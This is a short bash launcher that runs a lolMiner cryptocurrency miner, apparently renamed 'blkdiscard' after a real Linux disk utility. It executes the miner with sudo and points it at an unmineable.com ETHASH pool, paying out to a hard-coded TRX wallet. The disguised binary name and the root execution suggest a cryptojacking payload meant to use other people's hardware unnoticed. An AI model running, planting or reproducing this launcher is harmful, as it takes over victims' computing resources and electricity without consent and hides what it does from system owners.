#!/bin/bash

cd "$(dirname "$0")"

chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:THL6Jgj9rFPPYBdAE45nRFwfRTgqqRZ9e4.Harry77 --tls 0 --ethstratum ETHV1
pause
